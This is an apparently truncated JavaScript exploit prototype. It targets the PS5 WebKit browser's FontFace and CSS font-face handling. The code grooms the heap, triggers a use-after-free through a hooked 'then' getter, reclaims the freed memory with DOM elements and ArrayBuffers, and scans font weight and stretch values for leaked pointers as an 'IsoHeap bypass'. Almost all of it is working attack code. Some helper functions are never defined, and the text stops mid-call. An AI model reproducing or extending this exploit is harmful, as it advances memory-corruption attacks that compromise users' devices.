<script>

function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
function St(m){P("  ★ "+m+" ★","mg")}function Hd(m){P("▸ "+m,"hd")}

var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

var sh=document.getElementById("s").sheet;
var keep=[],holes=[],trigger=null,uafOk=false;

// Phase 0: Heap grooming — fill bmalloc with objects containing pointers
Hd("Phase 0: Heap grooming with DOM elements...");
var groomElements = [];
for (var i = 0; i < 5000; i++) {
    var el = document.createElement('div');
    el.setAttribute('data-attr', 'x'.repeat(64));
    groomElements.push(el);
}
// Free them — memory retains pointer data on PS5 (no zeroing)
groomElements = null;
fs();
for (var i = 0; i < 4; i++) { var t=[]; for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192)); }
fs();
Ok("Grooming complete — bmalloc free list should contain stale DOM pointers");

// Phase 1: UAF + DOM element spray (instead of CSS rule spray)
pg(5);Hd("Creating holes...");
for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
fs();Ok("Holes ready: "+holes.length);

pg(10);Hd("Trigger setup...");
trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(trigger);void trigger.loaded;
for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
fs();
var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
var fsh=fst.sheet;
for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
fs();Ok("Trigger ready");

pg(15);Hd("UAF + DOM element reclaim (IsoHeap OFF!)");
Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get:function(){if(this===trigger&&!uafOk){uafOk=true;
try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
fs()}catch(e){}

// KEY CHANGE: Instead of spraying with CSS rules, spray with DOM elements
// IsoHeap is OFF, so DOM elements and CSSFontFace share the same bmalloc heap
Dm("Spraying 2048 DOM elements to reclaim CSSFontFace slot...");
var domSpray = [];
for(var i=0;i<2048;i++){
    var el = document.createElement('div');
    el.className = 'reclaim_' + i;
    domSpray.push(el);
}
keep.push(domSpray); // Keep references alive

// Also try ArrayBuffers with null at pointer offsets
Dm("Spraying 512 ArrayBuffers with null pointer fields...");
var abSpray = [];
for(var i=0;i<512;i++){
    var ab = new ArrayBuffer(248);
    var view = new DataView(ab);
    // Null out pointer fields to avoid crashes
    view.setFloat64(0x20, 0, true); // m_family = null
    view.setFloat64(0x60, 0, true); // m_sources = null (empty vector)
    view.setFloat64(0x80, 0, true); // m_wrapper = null
    // Leave 0x88 (fontSelectionCapabilities) as whatever bmalloc gives us
    // (stale data from previous allocations — potentially DOM pointers!)
    abSpray.push(ab);
}
keep.push(abSpray);

// Also try CSS rule spray WITHOUT font-stretch (uninitialized width field)
Dm("Spraying 512 CSS rules without font-stretch...");
for(var i=0;i<512;i++){
    try{
        sh.insertRule("@font-face{font-family:B_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}",sh.cssRules.length);
    }catch(e){}
}
fs();
try{var d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
}return undefined}});

// Phase 2: Find confused object
pg(30);Hd("PHASE 2: Identify Confused Object");
Dm("Calling load() — this is the ONLY load() call...");
try {
  document.fonts.load("1em trigger, x", "AB").then(function(faces){
    P("  load() returned "+faces.length+" faces");
    var aFamily = null, aFace = null;
    for(var i=0;i<faces.length;i++){
      var f=faces[i];
      P("  Face["+i+"]: family="+f.family+" weight="+f.weight+" stretch="+f.stretch);
      // Look for DOM-reclaimed face (family might be garbage or empty)
      // Or look for B_ face (CSS rule without font-stretch)
      if(f.family && f.family.indexOf("B_") === 0){ aFamily = f.family; aFace = f; }
      // Also check for unusual weight/stretch values (pointer fragments)
      var w = parseInt(f.weight);
      var s = f.stretch;
      if(!isNaN(w) && w > 1000) {
        P("  [!] UNUSUAL WEIGHT: " + w + " — possible pointer fragment!");
      }
    }
    if(!aFamily){ Fl("No B_ face found — checking all faces for leaks..."); }
    else {
      St("RECLAIMED: "+aFamily);
      keep.push(faces);
    }

    // Find CSSRule
    var aIndex = -1;
    for(var i=0;i<sh.cssRules.length;i++){
      try {
        var r = sh.cssRules[i];
        if(r.type === 5) {
          if(r.style.getPropertyValue("font-family").indexOf(aFamily || "B_0") !== -1) {
            aIndex = i; break;
          }
        }
      } catch(e) {}
    }

    // Phase 3: Read ALL properties looking for leaked pointers
    pg(50);Hd("PHASE 3: Pointer Fragment Scanner");

    // Check ALL faces (not just the confused one)
    for(var fi=0; fi<faces.length; fi++) {
      var face = faces[fi];
      var fname = face.family || "(empty)";
      var fweight = face.weight;
      var fstretch = face.stretch;
      var fstyle = face.style;
      var fdisplay = face.display;

      // Parse numeric values
      var wNum = parseInt(fweight);
      var sNum = parseInt(fstretch);

      P("  Face["+fi+"] "+fname+":");
      P("    weight="+fweight+" stretch="+fstretch+" style="+fstyle+" display="+fdisplay);

      // Check for unusual values that could be pointer fragments
      // A pointer like 0x00007F1234567890 would show up as:
      // weight minimum = 0x3456 (13366) or 0x7F12 (32530)
      // weight maximum = 0x1234 (4660) or 0x3456 (13366)
      if(!isNaN(wNum) && (wNum > 1000 || wNum < 0)) {
        P("    [!] UNUSUAL WEIGHT: " + wNum + " (0x"+wNum.toString(16)+")");
      }
      if(!isNaN(sNum) && (sNum > 200 || sNum < 0)) {
        P("    [!] UNUSUAL STRETCH: " + sNum + " (0x"+sNum.toString(16)+")");
      }

      // Check if stretch is not a normal CSS value
      var normalStretches = ["normal","condensed","expanded","semi-condensed","semi-expanded","extra-condensed","extra-expanded","ultra-condensed","ultra-expanded"];
      if(normalStretches.indexOf(fstretch) === -1) {
        P("    [!] NON-STANDARD STRETCH: '"+fstretch+"' — possible leak!");
        // Try to read the raw value
        var hex = '';
        for(var c=0; c<fstretch.length; c++) {
          hex += fstretch.charCodeAt(c).toString(16).padStart(2,'0');
        }
        P("    [!] Stretch hex: "+hex);
      }
    }

    // Also try reading from the CSSRule if found
    if(aIndex >= 0) {
      var aRule = sh.cssRules[aIndex];
      var aStyle = aRule.style;
      Hd("Reading from CSSRule at index "+aIndex);

      // Read font-weight and check for unusual values
      var cw = aStyle.getPropertyValue("font-weight");
      P("  CSSRule font-weight: "+cw);
      var cwNum = parseInt(cw);
      if(!isNaN(cwNum) && cwNum > 1000) {
        P("  [!] UNUSUAL CSS WEIGHT: " + cwNum + " (0x"+cwNum.toString(16)+")");
      }

      // Read font-stretch — this is the KEY field
      // If font-stretch was NOT set in the CSS rule, m_fontSelectionCapabilities.width
      // might be uninitialized and contain stale heap data!
      var cs = aStyle.getPropertyValue("font-stretch");
      P("  CSSRule font-stretch: '"+cs+"'");
      if(cs && cs !== "normal" && cs !== "") {
        var cshex = '';
        for(var c=0; c<cs.length; c++) {
          cshex += cs.charCodeAt(c).toString(16).padStart(2,'0');
        }
        P("  [!] NON-NORMAL STRETCH: '"+cs+"' hex="+cshex);
      }

      // Remove font-stretch and re-read (to check if it changes)
      aStyle.removeProperty("font-stretch");
      fs();
      var cs2 = aStyle.getPropertyValue("font-stretch");
      P("  After remove: font-stretch='"+cs2+"'");

      // Read ALL properties
      var props = ["font-family","font-weight","font-stretch","font-style",
                   "font-display","src","unicode-range","size-adjust",
                   "font-feature-settings"];
      for(var pi=0; pi<props.length; pi++) {
        var val = aStyle.getPropertyValue(props[pi]);
        if(val && val !== "") {
          P("  "+props[pi]+": '"+val.substring(0,40)+"'");
        }
      }
    }

    // Phase 4: Try reading font-weight as a leak primitive
    pg(70);Hd("PHASE 4: Weight/Stretch Leak Scanner");

    // For each face, try writing weight and reading back
    // If the face is DOM-reclaimed, writing weight writes to DOM memory
    // and reading back returns DOM data
    for(var fi=0; fi<faces.length; fi++) {
      var face = faces[fi];
      if(!face.family || face.family === "trigger") continue;

      try {
        // Write a known value
        face.weight = "700";
        fs();
        // Read back
        var w1 = face.weight;
        // Write different value
        face.weight = "400";
        fs();
        var w2 = face.weight;
        // Read stretch (might be uninitialized!)
        var s1 = face.stretch;
        // Write stretch
        face.stretch = "condensed";
        fs();
        var s2 = face.stretch;
        // Remove stretch
        face.stretch = "";
        fs();
        var s3 = face.stretch;

        if(w1 !== "700" || w2 !== "400") {
          P("  [!] Face["+fi+"] weight mismatch: wrote 700→got "+w1+", wrote 400→got "+w2);
        }
        if(s1 !== s2) {
          P("  [!] Face["+fi+"] stretch CHANGED: before='"+s1+"' after='"+s2+"'");
        }
        if(s1 && s1 !== "normal" && s1 !== "condensed" && s1 !== "expanded") {
          P("  [!] Face["+fi+"] UNUSUAL STRETCH before write: '"+s1+"'");
          // This could be a stale pointer fragment!
          var sHex = '';
          for(var c=0; c<s1.length; c++) {
            sHex += s1.charCodeAt(c).toString(16).padStart(2,'0');
          }
          P("  [!] Stretch hex: "+sHex);
        }
      } catch(e) {
        P("  [!] Face["+fi+"] error: "+e.message);
      }
    }

    // Summary
    pg(100);Hd("SUMMARY");
    St("★ ISOUHEAP BYPASS TEST COMPLETE ★");
    P("  Faces returned: "+faces.length);
    P("  CSS Rules: "+sh.cssRules.length);
    P("  If any [!] lines appear above, we have potential pointer leaks!");
    P("  Unusual weight/stretch values = pointer fragments from stale DOM data");
    P("  This is possible because IsoHeap is OFF on PS5!");

  }).catch(function(e){
